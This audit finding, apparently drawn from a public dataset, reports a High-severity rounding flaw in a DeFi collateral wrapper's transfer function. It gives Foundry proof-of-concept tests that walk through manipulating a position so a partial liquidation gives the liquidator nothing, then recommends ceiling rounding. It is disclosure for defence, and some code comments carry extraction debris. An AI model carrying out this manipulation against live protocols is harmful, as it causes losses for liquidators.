# [H] rounding_in_favor_of_the_violator_can_subject_liquidators_to_losses_during_partial_liquidation

## Summary
Severity: High
Contest weight: 0.0000
Dataset id: 23481
Source: https://huggingface.co/datasets/Zaevlad/audit-findings-dataset
Type: audit-finding

## Details
Description: Currently, ERC721WrapperBase::transfer rounds in favor of the sender, or in the context of liquidation in favor of the violator:
```solidity
/// @notice For regular EVK vaults, it transfers the specified amount of vault shares from the sender to
/// the receiver,!
/// @dev For ERC721WrapperBase, transfers a proportional amount of ERC6909 tokens (calculated as
/// totalSupply(tokenId) * amount / balanceOf(sender)) for each enabled tokenId from the sender to the
/// receiver.
...
/// @dev no need to check if sender is being liquidated, sender can choose to do this at any time
/// @dev When calculating how many ERC6909 tokens to transfer, rounding is performed in favor of the
/// sender (typically the violator).,!
/// @dev This means that the sender may end up with a slightly larger amount of ERC6909 tokens than
/// expected, as the rounding is done in their favor.,!
function transfer(address to, uint256 amount) external callThroughEVC returns (bool) {
    address sender = _msgSender();
    uint256 currentBalance = balanceOf(sender);
    uint256 totalTokenIds = totalTokenIdsEnabledBy(sender);
    for (uint256 i = 0; i < totalTokenIds; ++i) {
        uint256 tokenId = tokenIdOfOwnerByIndex(sender, i);
        _transfer(sender, to, tokenId, normalizedToFull(tokenId, amount, currentBalance)); //this
        concludes the liquidation. The liquidator can come back to do whatever they want with the
        ERC6909 tokens
        ,!
        ,!
    }
    return true;
}
```
This stems from the usage of `Math::mulDiv` in `ERC721WrapperBase` which performs floor rounding when calculating the normalized amount of ERC-6909 token to transfer for the given sender's underlying collateral value:
```solidity
function normalizedToFull(uint256 tokenId, uint256 amount, uint256 currentBalance) public view returns (uint256) {
    return Math.mulDiv(amount, totalSupply(tokenId), currentBalance);
}
```
However, this behavior can be leveraged by a malicious actor to inflate the value of their position. Considering the scenario in which a borrower enables multiple tokenIds as collateral, this is possible if they unwrap all but 1 wei of the ERC-6909 token balance for a given tokenId. This can also occur when one of the tokenIds is fully transferred per the proportional calculation by an earlier partial liquidation. In both cases, this leaves behind 1 wei due to rounding which can cause issues during subsequent liquidation.

Note that it is not possible to inflate the value of 1 wei of ERC-6909 token by adding liquidity to the underlying position since atomically unwrapping the full position, adding liquidity, and rewrapping ... would result in the FULL_AMOUNT of ERC-6909 tokens being minted again. It is, however, possible to leverage fee accrual from donations and swaps, which contributes to the value of the position, to inflate 1 wei in this manner.

Rounding should therefore be done in favor of the liquidator to avoid the scenario in which they are forced to either perform a full liquidation or sustain losses due to a partial liquidation in which they receive no ERC-6909 tokens.

## Proof of Concept
Run the following tests with `forge test --mt test_transferRoundingPoC -vvv`:

### Test without the transfer inflation fix applied
```solidity
function test_transferRoundingPoC_currentTransfer() public {
    address borrower2 = makeAddr("borrower2");
    LiquidityParams memory params = LiquidityParams({
        tickLower: TickMath.MIN_TICK + 1,
        tickUpper: TickMath.MAX_TICK - 1,
        liquidityDelta: -19999
    });
    (uint256 tokenId1,,) = boundLiquidityParamsAndMint(params);
    (uint256 tokenId2,,) = boundLiquidityParamsAndMint(params);
    startHoax(borrower);
    // 1. borrower wraps tokenId1
    wrapper.underlying().approve(address(wrapper), tokenId1);
    wrapper.wrap(tokenId1, borrower);
    wrapper.enableTokenIdAsCollateral(tokenId1);
    // 2. borrower sends some of tokenId1 to borrower2
    wrapper.transfer(borrower2, wrapper.balanceOf(borrower) / 2);
    // 3. borrower wraps tokenId2
    wrapper.underlying().approve(address(wrapper), tokenId2);
    wrapper.wrap(tokenId2, borrower);
    wrapper.enableTokenIdAsCollateral(tokenId2);
    // 4. borrower max borrows from vault
    evc.enableCollateral(borrower, address(wrapper));
    evc.enableController(borrower, address(eVault));
    eVault.borrow(type(uint256).max, borrower);
    vm.warp(block.timestamp + eVault.liquidationCoolOffTime());
    (uint256 maxRepay, uint256 yield) = eVault.checkLiquidation(liquidator, borrower, address(wrapper));
    assertEq(maxRepay, 0);
    assertEq(yield, 0);
    // 5. simulate borrower becoming partially liquidatable
    startHoax(IEulerRouter(address(oracle)).governor());
    IEulerRouter(address(oracle)).govSetConfig(
        address(wrapper),
        unitOfAccount,
        address(new FixedRateOracle(address(wrapper), unitOfAccount, 1))
    );
    (maxRepay, yield) = eVault.checkLiquidation(liquidator, borrower, address(wrapper));
    assertTrue(maxRepay > 0);
    // 6. liquidator partially liquidates borrower
    startHoax(liquidator);
    evc.enableCollateral(liquidator, address(wrapper));
    evc.enableController(liquidator, address(eVault));
    wrapper.enableTokenIdAsCollateral(tokenId1);
    wrapper.enableTokenIdAsCollateral(tokenId2);
    eVault.liquidate(borrower, address(wrapper), maxRepay / 2, 0);
    console.log("balanceOf(borrower, tokenId1): %s", wrapper.balanceOf(borrower, tokenId1));
    console.log("balanceOf(borrower, tokenId2): %s", wrapper.balanceOf(borrower, tokenId2));
}
```

### Test with the H-02 fix applied
```solidity
function test_transferRoundingPoC_transferFixed() public {
    LiquidityParams memory params = LiquidityParams({
        tickLower: TickMath.MIN_TICK + 1,
        tickUpper: TickMath.MAX_TICK - 1,
        liquidityDelta: -19999
    });
    (uint256 tokenId1,,) = boundLiquidityParamsAndMint(params);
    (uint256 tokenId2,,) = boundLiquidityParamsAndMint(params);
    startHoax(borrower);
    // 1. borrower wraps tokenId1
    wrapper.underlying().approve(address(wrapper), tokenId1);
    wrapper.wrap(tokenId1, borrower);
    wrapper.enableTokenIdAsCollateral(tokenId1);
    // 2. borrower unwraps all but 1 wei of tokenId1
    wrapper.unwrap(
        borrower,
        tokenId1,
        borrower,
        wrapper.FULL_AMOUNT() - 1,
        bytes("")
    );
    // 3. borrower wraps tokenId2
    wrapper.underlying().approve(address(wrapper), tokenId2);
    wrapper.wrap(tokenId2, borrower);
    wrapper.enableTokenIdAsCollateral(tokenId2);
    // 4. borrower max borrows from vault
    evc.enableCollateral(borrower, address(wrapper));
    evc.enableController(borrower, address(eVault));
    eVault.borrow(type(uint256).max, borrower);
    vm.warp(block.timestamp + eVault.liquidationCoolOffTime());
    (uint256 maxRepay, uint256 yield) = eVault.checkLiquidation(liquidator, borrower, address(wrapper));
    assertEq(maxRepay, 0);
    assertEq(yield, 0);
    // 5. swap to accrue fees
    swapExactInput(borrower, address(token0), address(token1), 100 * unit0);
    // 6. simulate borrower becoming partially liquidatable
    startHoax(IEulerRouter(address(oracle)).governor());
    IEulerRouter(address(oracle)).govSetConfig(
        address(wrapper),
        unitOfAccount,
        address(new FixedRateOracle(address(wrapper), unitOfAccount, 1))
    );
    (maxRepay, yield) = eVault.checkLiquidation(liquidator, borrower, address(wrapper));
    assertTrue(maxRepay > 0);
    // 7. liquidator partially liquidates borrower but receives no tokenId1
    startHoax(liquidator);
    evc.enableCollateral(liquidator, address(wrapper));
    evc.enableController(liquidator, address(eVault));
    wrapper.enableTokenIdAsCollateral(tokenId1);
    wrapper.enableTokenIdAsCollateral(tokenId2);
    uint256 liquidatorBalanceOfTokenId1Before = wrapper.balanceOf(liquidator, tokenId1);
    uint256 liquidatorBalanceOfTokenId2Before = wrapper.balanceOf(liquidator, tokenId2);
    eVault.liquidate(borrower, address(wrapper), maxRepay / 2, 0);
    uint256 liquidatorBalanceOfTokenId1After = wrapper.balanceOf(liquidator, tokenId1);
    uint256 liquidatorBalanceOfTokenId2After = wrapper.balanceOf(liquidator, tokenId2);
    console.log("balanceOf(borrower, tokenId1): %s", wrapper.balanceOf(borrower, tokenId1));
    console.log("balanceOf(borrower, tokenId2): %s", wrapper.balanceOf(borrower, tokenId2));
    console.log("liquidatorBalanceOfTokenId1Before: %s", liquidatorBalanceOfTokenId1Before);
    console.log("liquidatorBalanceOfTokenId1After: %s", liquidatorBalanceOfTokenId1After);
    console.log("liquidatorBalanceOfTokenId2Before: %s", liquidatorBalanceOfTokenId2Before);
    console.log("liquidatorBalanceOfTokenId2After: %s", liquidatorBalanceOfTokenId2After);
    assertGt(liquidatorBalanceOfTokenId1After, liquidatorBalanceOfTokenId1Before);
    assertGt(liquidatorBalanceOfTokenId2After, liquidatorBalanceOfTokenId2Before);
}
```

## Recommendation
Recommended Mitigation: Consider rounding in favor of the liquidator:
```solidity
function normalizedToFull(uint256 tokenId, uint256 amount, uint256 currentBalance) public view returns (uint256) {
    // - return Math.mulDiv(amount, totalSupply(tokenId), currentBalance);
    // + return Math.mulDiv(amount, balanceOf(_msgSender(), tokenId), currentBalance,
    // Math.Rounding.Ceil);
}
```
Also consider preventing liquidators from executing liquidations of zero value to avoid scenarios in which they can repeatedly extract 1 wei of a high-value position from the violator.
